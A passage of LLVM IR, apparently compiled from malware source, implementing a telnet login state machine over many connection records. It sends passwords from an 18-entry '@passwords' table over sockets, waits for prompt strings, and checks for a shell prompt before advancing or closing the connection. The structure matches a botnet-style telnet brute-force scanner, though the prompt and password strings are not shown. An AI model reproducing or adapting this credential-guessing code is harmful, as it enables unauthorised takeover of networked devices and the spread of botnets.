  store i8 0, i8* %812, align 1
  br label %1950

813:                                              ; preds = %790
  %814 = load i32, i32* %2, align 4
  %815 = sext i32 %814 to i64
  %816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %815
  %817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %816, i32 0, i32 8
  %818 = load i8*, i8** %817, align 8
  %819 = call i8* @strstr(i8* noundef %818, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i64 0, i64 0)) #11
  %820 = icmp ne i8* %819, null
  br i1 %820, label %821, label %836

821:                                              ; preds = %813
  %822 = load i32, i32* %2, align 4
  %823 = sext i32 %822 to i64
  %824 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %823
  %825 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %824, i32 0, i32 0
  %826 = load i32, i32* %825, align 16
  %827 = call i32 @sclose(i32 noundef %826)
  %828 = load i32, i32* %2, align 4
  %829 = sext i32 %828 to i64
  %830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %829
  %831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %830, i32 0, i32 2
  store i8 0, i8* %831, align 8
  %832 = load i32, i32* %2, align 4
  %833 = sext i32 %832 to i64
  %834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %833
  %835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %834, i32 0, i32 3
  store i8 0, i8* %835, align 1
  br label %1950

836:                                              ; preds = %813
  %837 = load i32, i32* %2, align 4
  %838 = sext i32 %837 to i64
  %839 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %838
  %840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %839, i32 0, i32 8
  %841 = load i8*, i8** %840, align 8
  %842 = call i8* @strstr(i8* noundef %841, i8* noundef getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0)) #11
  %843 = icmp ne i8* %842, null
  br i1 %843, label %844, label %859

844:                                              ; preds = %836
  %845 = load i32, i32* %2, align 4
  %846 = sext i32 %845 to i64
  %847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %846
  %848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %847, i32 0, i32 0
  %849 = load i32, i32* %848, align 16
  %850 = call i32 @sclose(i32 noundef %849)
  %851 = load i32, i32* %2, align 4
  %852 = sext i32 %851 to i64
  %853 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %852
  %854 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %853, i32 0, i32 2
  store i8 0, i8* %854, align 8
  %855 = load i32, i32* %2, align 4
  %856 = sext i32 %855 to i64
  %857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %856
  %858 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %857, i32 0, i32 3
  store i8 0, i8* %858, align 1
  br label %1950

859:                                              ; preds = %836
  %860 = load i32, i32* %2, align 4
  %861 = sext i32 %860 to i64
  %862 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %861
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %862, i32 0, i32 8
  %864 = load i8*, i8** %863, align 8
  %865 = call i8* @strstr(i8* noundef %864, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i64 0, i64 0)) #11
  %866 = icmp ne i8* %865, null
  br i1 %866, label %867, label %882

867:                                              ; preds = %859
  %868 = load i32, i32* %2, align 4
  %869 = sext i32 %868 to i64
  %870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %869
  %871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %870, i32 0, i32 0
  %872 = load i32, i32* %871, align 16
  %873 = call i32 @sclose(i32 noundef %872)
  %874 = load i32, i32* %2, align 4
  %875 = sext i32 %874 to i64
  %876 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %875
  %877 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %876, i32 0, i32 2
  store i8 0, i8* %877, align 8
  %878 = load i32, i32* %2, align 4
  %879 = sext i32 %878 to i64
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %879
  %881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %880, i32 0, i32 3
  store i8 0, i8* %881, align 1
  br label %1950

882:                                              ; preds = %859
  %883 = load i32, i32* %2, align 4
  %884 = sext i32 %883 to i64
  %885 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %884
  %886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %885, i32 0, i32 8
  %887 = load i8*, i8** %886, align 8
  %888 = call i8* @strstr(i8* noundef %887, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i64 0, i64 0)) #11
  %889 = icmp ne i8* %888, null
  br i1 %889, label %890, label %905

890:                                              ; preds = %882
  %891 = load i32, i32* %2, align 4
  %892 = sext i32 %891 to i64
  %893 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %892
  %894 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %893, i32 0, i32 0
  %895 = load i32, i32* %894, align 16
  %896 = call i32 @sclose(i32 noundef %895)
  %897 = load i32, i32* %2, align 4
  %898 = sext i32 %897 to i64
  %899 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %898
  %900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %899, i32 0, i32 2
  store i8 0, i8* %900, align 8
  %901 = load i32, i32* %2, align 4
  %902 = sext i32 %901 to i64
  %903 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %902
  %904 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %903, i32 0, i32 3
  store i8 0, i8* %904, align 1
  br label %1950

905:                                              ; preds = %882
  br label %906

906:                                              ; preds = %905
  br label %907

907:                                              ; preds = %906
  br label %908

908:                                              ; preds = %907
  br label %909

909:                                              ; preds = %908
  br label %910

910:                                              ; preds = %909
  br label %911

911:                                              ; preds = %910
  br label %912

912:                                              ; preds = %911
  %913 = load i32, i32* %2, align 4
  %914 = sext i32 %913 to i64
  %915 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %914
  %916 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %915, i32 0, i32 8
  %917 = load i8*, i8** %916, align 8
  %918 = call i64 @strlen(i8* noundef %917) #11
  %919 = trunc i64 %918 to i16
  %920 = load i32, i32* %2, align 4
  %921 = sext i32 %920 to i64
  %922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %921
  %923 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %922, i32 0, i32 7
  store i16 %919, i16* %923, align 16
  br label %924

924:                                              ; preds = %912
  br label %925

925:                                              ; preds = %924
  %926 = load i32, i32* %2, align 4
  %927 = sext i32 %926 to i64
  %928 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %927
  %929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %928, i32 0, i32 6
  %930 = load i32, i32* %929, align 4
  %931 = add i32 %930, 10
  %932 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %933 = icmp ult i32 %931, %932
  br i1 %933, label %934, label %949

934:                                              ; preds = %925
  %935 = load i32, i32* %2, align 4
  %936 = sext i32 %935 to i64
  %937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %936
  %938 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %937, i32 0, i32 0
  %939 = load i32, i32* %938, align 16
  %940 = call i32 @sclose(i32 noundef %939)
  %941 = load i32, i32* %2, align 4
  %942 = sext i32 %941 to i64
  %943 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %942
  %944 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %943, i32 0, i32 2
  store i8 0, i8* %944, align 8
  %945 = load i32, i32* %2, align 4
  %946 = sext i32 %945 to i64
  %947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %946
  %948 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %947, i32 0, i32 3
  store i8 1, i8* %948, align 1
  br label %949

949:                                              ; preds = %934, %925
  br label %1949

950:                                              ; preds = %69
  %951 = load i32, i32* %2, align 4
  %952 = sext i32 %951 to i64
  %953 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %952
  %954 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %953, i32 0, i32 0
  %955 = load i32, i32* %954, align 16
  %956 = load i32, i32* %2, align 4
  %957 = sext i32 %956 to i64
  %958 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %957
  %959 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %958, i32 0, i32 5
  %960 = load i8, i8* %959, align 1
  %961 = zext i8 %960 to i64
  %962 = getelementptr inbounds [18 x i8*], [18 x i8*]* @passwords, i64 0, i64 %961
  %963 = load i8*, i8** %962, align 8
  %964 = load i32, i32* %2, align 4
  %965 = sext i32 %964 to i64
  %966 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %965
  %967 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %966, i32 0, i32 5
  %968 = load i8, i8* %967, align 1
  %969 = zext i8 %968 to i64
  %970 = getelementptr inbounds [18 x i8*], [18 x i8*]* @passwords, i64 0, i64 %969
  %971 = load i8*, i8** %970, align 8
  %972 = call i64 @strlen(i8* noundef %971) #11
  %973 = call i64 @send(i32 noundef %955, i8* noundef %963, i64 noundef %972, i32 noundef 16384)
  %974 = icmp slt i64 %973, 0
  br i1 %974, label %975, label %990

975:                                              ; preds = %950
  %976 = load i32, i32* %2, align 4
  %977 = sext i32 %976 to i64
  %978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %977
  %979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %978, i32 0, i32 0
  %980 = load i32, i32* %979, align 16
  %981 = call i32 @sclose(i32 noundef %980)
  %982 = load i32, i32* %2, align 4
  %983 = sext i32 %982 to i64
  %984 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %983
  %985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %984, i32 0, i32 2
  store i8 0, i8* %985, align 8
  %986 = load i32, i32* %2, align 4
  %987 = sext i32 %986 to i64
  %988 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %987
  %989 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %988, i32 0, i32 3
  store i8 1, i8* %989, align 1
  br label %1950

990:                                              ; preds = %950
  %991 = load i32, i32* %2, align 4
  %992 = sext i32 %991 to i64
  %993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %992
  %994 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %993, i32 0, i32 0
  %995 = load i32, i32* %994, align 16
  %996 = call i64 @send(i32 noundef %995, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  %997 = icmp slt i64 %996, 0
  br i1 %997, label %998, label %1013

998:                                              ; preds = %990
  %999 = load i32, i32* %2, align 4
  %1000 = sext i32 %999 to i64
  %1001 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1000
  %1002 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1001, i32 0, i32 0
  %1003 = load i32, i32* %1002, align 16
  %1004 = call i32 @sclose(i32 noundef %1003)
  %1005 = load i32, i32* %2, align 4
  %1006 = sext i32 %1005 to i64
  %1007 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1006
  %1008 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1007, i32 0, i32 2
  store i8 0, i8* %1008, align 8
  %1009 = load i32, i32* %2, align 4
  %1010 = sext i32 %1009 to i64
  %1011 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1010
  %1012 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1011, i32 0, i32 3
  store i8 1, i8* %1012, align 1
  br label %1950

1013:                                             ; preds = %990
  %1014 = load i32, i32* %2, align 4
  %1015 = sext i32 %1014 to i64
  %1016 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1015
  %1017 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1016, i32 0, i32 2
  store i8 6, i8* %1017, align 8
  br label %1949

1018:                                             ; preds = %69
  %1019 = load i32, i32* %2, align 4
  %1020 = sext i32 %1019 to i64
  %1021 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1020
  %1022 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1021, i32 0, i32 6
  %1023 = load i32, i32* %1022, align 4
  %1024 = icmp eq i32 %1023, 0
  br i1 %1024, label %1025, label %1031

1025:                                             ; preds = %1018
  %1026 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %1027 = load i32, i32* %2, align 4
  %1028 = sext i32 %1027 to i64
  %1029 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1028
  %1030 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1029, i32 0, i32 6
  store i32 %1026, i32* %1030, align 4
  br label %1031

1031:                                             ; preds = %1025, %1018
  %1032 = load i32, i32* %2, align 4
  %1033 = sext i32 %1032 to i64
  %1034 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1033
  %1035 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1034, i32 0, i32 0
  %1036 = load i32, i32* %1035, align 16
  %1037 = load i32, i32* %2, align 4
  %1038 = sext i32 %1037 to i64
  %1039 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1038
  %1040 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1039, i32 0, i32 8
  %1041 = load i8*, i8** %1040, align 8
  %1042 = load i32, i32* %2, align 4
  %1043 = sext i32 %1042 to i64
  %1044 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1043
  %1045 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1044, i32 0, i32 7
  %1046 = load i16, i16* %1045, align 16
  %1047 = zext i16 %1046 to i32
  %1048 = call i32 @readUntil(i32 noundef %1036, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i64 0, i64 0), i32 noundef 1, i32 noundef 0, i32 noundef 10000, i8* noundef %1041, i32 noundef 1024, i32 noundef %1047)
  %1049 = icmp ne i32 %1048, 0
  br i1 %1049, label %1050, label %1125

1050:                                             ; preds = %1031
  %1051 = load i32, i32* %2, align 4
  %1052 = sext i32 %1051 to i64
  %1053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1052
  %1054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1053, i32 0, i32 6
  store i32 0, i32* %1054, align 4
  %1055 = load i32, i32* %2, align 4
  %1056 = sext i32 %1055 to i64
  %1057 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1056
  %1058 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1057, i32 0, i32 7
  store i16 0, i16* %1058, align 16
  %1059 = load i32, i32* %2, align 4
  %1060 = sext i32 %1059 to i64
  %1061 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1060
  %1062 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1061, i32 0, i32 8
  %1063 = load i8*, i8** %1062, align 8
  %1064 = call i8* @strstr(i8* noundef %1063, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i64 0, i64 0)) #11
  %1065 = icmp ne i8* %1064, null
  br i1 %1065, label %1066, label %1086

1066:                                             ; preds = %1050
  %1067 = load i32, i32* %2, align 4
  %1068 = sext i32 %1067 to i64
  %1069 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1068
  %1070 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1069, i32 0, i32 8
  %1071 = load i8*, i8** %1070, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1071, i8 0, i64 1024, i1 false)
  %1072 = load i32, i32* %2, align 4
  %1073 = sext i32 %1072 to i64
  %1074 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1073
  %1075 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1074, i32 0, i32 0
  %1076 = load i32, i32* %1075, align 16
  %1077 = call i32 @sclose(i32 noundef %1076)
  %1078 = load i32, i32* %2, align 4
  %1079 = sext i32 %1078 to i64
  %1080 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1079
  %1081 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1080, i32 0, i32 2
  store i8 0, i8* %1081, align 8
  %1082 = load i32, i32* %2, align 4
  %1083 = sext i32 %1082 to i64
  %1084 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1083
  %1085 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1084, i32 0, i32 3
  store i8 0, i8* %1085, align 1
  br label %1950

1086:                                             ; preds = %1050
  %1087 = load i32, i32* %2, align 4
  %1088 = sext i32 %1087 to i64
  %1089 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1088
  %1090 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1089, i32 0, i32 8
  %1091 = load i8*, i8** %1090, align 8
  %1092 = call i32 @matchPrompt(i8* noundef %1091)
  %1093 = icmp ne i32 %1092, 0
  br i1 %1093, label %1114, label %1094

1094:                                             ; preds = %1086
  %1095 = load i32, i32* %2, align 4
  %1096 = sext i32 %1095 to i64
  %1097 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1096
  %1098 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1097, i32 0, i32 8
  %1099 = load i8*, i8** %1098, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1099, i8 0, i64 1024, i1 false)
  %1100 = load i32, i32* %2, align 4
  %1101 = sext i32 %1100 to i64
  %1102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1101
  %1103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1102, i32 0, i32 0
  %1104 = load i32, i32* %1103, align 16
  %1105 = call i32 @sclose(i32 noundef %1104)
  %1106 = load i32, i32* %2, align 4
  %1107 = sext i32 %1106 to i64
  %1108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1107
  %1109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1108, i32 0, i32 2
  store i8 0, i8* %1109, align 8
  %1110 = load i32, i32* %2, align 4
  %1111 = sext i32 %1110 to i64
  %1112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1111
  %1113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1112, i32 0, i32 3
  store i8 1, i8* %1113, align 1
  br label %1950

1114:                                             ; preds = %1086
  %1115 = load i32, i32* %2, align 4
  %1116 = sext i32 %1115 to i64
  %1117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1116
  %1118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1117, i32 0, i32 2
  store i8 7, i8* %1118, align 8
  br label %1119

1119:                                             ; preds = %1114
  %1120 = load i32, i32* %2, align 4
  %1121 = sext i32 %1120 to i64
  %1122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1121
  %1123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1122, i32 0, i32 8
  %1124 = load i8*, i8** %1123, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1124, i8 0, i64 1024, i1 false)
  br label %1950

1125:                                             ; preds = %1031
  %1126 = load i32, i32* %2, align 4
  %1127 = sext i32 %1126 to i64
  %1128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1127
  %1129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1128, i32 0, i32 0
  %1130 = load i32, i32* %1129, align 16
  %1131 = load i32, i32* %2, align 4
  %1132 = sext i32 %1131 to i64
  %1133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1132
  %1134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1133, i32 0, i32 8
  %1135 = load i8*, i8** %1134, align 8
  %1136 = load i32, i32* %2, align 4
  %1137 = sext i32 %1136 to i64
  %1138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1137
  %1139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1138, i32 0, i32 7
  %1140 = load i16, i16* %1139, align 16
  %1141 = zext i16 %1140 to i32
  %1142 = call i32 @readUntil(i32 noundef %1130, i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i64 0, i64 0), i32 noundef 1, i32 noundef 0, i32 noundef 10000, i8* noundef %1135, i32 noundef 1024, i32 noundef %1141)
  %1143 = icmp ne i32 %1142, 0
  br i1 %1143, label %1144, label %1219

1144:                                             ; preds = %1125
  %1145 = load i32, i32* %2, align 4
  %1146 = sext i32 %1145 to i64
  %1147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1146
  %1148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1147, i32 0, i32 6
  store i32 0, i32* %1148, align 4
  %1149 = load i32, i32* %2, align 4
  %1150 = sext i32 %1149 to i64
  %1151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1150
  %1152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1151, i32 0, i32 7
  store i16 0, i16* %1152, align 16
  %1153 = load i32, i32* %2, align 4
  %1154 = sext i32 %1153 to i64
  %1155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1154
  %1156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1155, i32 0, i32 8
  %1157 = load i8*, i8** %1156, align 8
  %1158 = call i8* @strstr(i8* noundef %1157, i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i64 0, i64 0)) #11
  %1159 = icmp ne i8* %1158, null
  br i1 %1159, label %1160, label %1180

1160:                                             ; preds = %1144
  %1161 = load i32, i32* %2, align 4
  %1162 = sext i32 %1161 to i64
  %1163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1162
  %1164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1163, i32 0, i32 8
  %1165 = load i8*, i8** %1164, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1165, i8 0, i64 1024, i1 false)
  %1166 = load i32, i32* %2, align 4
  %1167 = sext i32 %1166 to i64
  %1168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1167
  %1169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1168, i32 0, i32 0
  %1170 = load i32, i32* %1169, align 16
  %1171 = call i32 @sclose(i32 noundef %1170)
  %1172 = load i32, i32* %2, align 4
  %1173 = sext i32 %1172 to i64
  %1174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1173
  %1175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1174, i32 0, i32 2
  store i8 0, i8* %1175, align 8
  %1176 = load i32, i32* %2, align 4
  %1177 = sext i32 %1176 to i64
  %1178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1177
  %1179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1178, i32 0, i32 3
  store i8 0, i8* %1179, align 1
  br label %1950

1180:                                             ; preds = %1144
  %1181 = load i32, i32* %2, align 4
  %1182 = sext i32 %1181 to i64
  %1183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1182
  %1184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1183, i32 0, i32 8
  %1185 = load i8*, i8** %1184, align 8
  %1186 = call i32 @matchPrompt(i8* noundef %1185)
  %1187 = icmp ne i32 %1186, 0
  br i1 %1187, label %1208, label %1188

1188:                                             ; preds = %1180
  %1189 = load i32, i32* %2, align 4
  %1190 = sext i32 %1189 to i64
  %1191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1190
  %1192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1191, i32 0, i32 8
  %1193 = load i8*, i8** %1192, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1193, i8 0, i64 1024, i1 false)
  %1194 = load i32, i32* %2, align 4
  %1195 = sext i32 %1194 to i64
  %1196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1195
  %1197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1196, i32 0, i32 0
  %1198 = load i32, i32* %1197, align 16
  %1199 = call i32 @sclose(i32 noundef %1198)
  %1200 = load i32, i32* %2, align 4
  %1201 = sext i32 %1200 to i64
  %1202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1201
  %1203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1202, i32 0, i32 2
  store i8 0, i8* %1203, align 8
  %1204 = load i32, i32* %2, align 4
  %1205 = sext i32 %1204 to i64
  %1206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1205
  %1207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1206, i32 0, i32 3
  store i8 1, i8* %1207, align 1
  br label %1950

1208:                                             ; preds = %1180
  %1209 = load i32, i32* %2, align 4
  %1210 = sext i32 %1209 to i64
  %1211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1210
  %1212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1211, i32 0, i32 2
  store i8 7, i8* %1212, align 8
  br label %1213

1213:                                             ; preds = %1208
  %1214 = load i32, i32* %2, align 4
  %1215 = sext i32 %1214 to i64
  %1216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1215
  %1217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1216, i32 0, i32 8
  %1218 = load i8*, i8** %1217, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1218, i8 0, i64 1024, i1 false)
  br label %1950

1219:                                             ; preds = %1125
  %1220 = load i32, i32* %2, align 4
  %1221 = sext i32 %1220 to i64
  %1222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1221
  %1223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1222, i32 0, i32 0
  %1224 = load i32, i32* %1223, align 16
  %1225 = load i32, i32* %2, align 4
  %1226 = sext i32 %1225 to i64
  %1227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1226
  %1228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1227, i32 0, i32 8
  %1229 = load i8*, i8** %1228, align 8
  %1230 = load i32, i32* %2, align 4
  %1231 = sext i32 %1230 to i64
  %1232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1231
  %1233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1232, i32 0, i32 7
  %1234 = load i16, i16* %1233, align 16
  %1235 = zext i16 %1234 to i32
  %1236 = call i32 @readUntil(i32 noundef %1224, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i64 0, i64 0), i32 noundef 1, i32 noundef 0, i32 noundef 10000, i8* noundef %1229, i32 noundef 1024, i32 noundef %1235)
  %1237 = icmp ne i32 %1236, 0
  br i1 %1237, label %1238, label %1313

1238:                                             ; preds = %1219
  %1239 = load i32, i32* %2, align 4
  %1240 = sext i32 %1239 to i64
  %1241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1240
  %1242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1241, i32 0, i32 6
  store i32 0, i32* %1242, align 4
  %1243 = load i32, i32* %2, align 4
  %1244 = sext i32 %1243 to i64
  %1245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1244
  %1246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1245, i32 0, i32 7
  store i16 0, i16* %1246, align 16
  %1247 = load i32, i32* %2, align 4
  %1248 = sext i32 %1247 to i64
  %1249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1248
  %1250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1249, i32 0, i32 8
  %1251 = load i8*, i8** %1250, align 8
  %1252 = call i8* @strstr(i8* noundef %1251, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i64 0, i64 0)) #11
  %1253 = icmp ne i8* %1252, null
  br i1 %1253, label %1254, label %1274

1254:                                             ; preds = %1238
  %1255 = load i32, i32* %2, align 4
  %1256 = sext i32 %1255 to i64
  %1257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1256
  %1258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1257, i32 0, i32 8
  %1259 = load i8*, i8** %1258, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1259, i8 0, i64 1024, i1 false)
  %1260 = load i32, i32* %2, align 4
  %1261 = sext i32 %1260 to i64
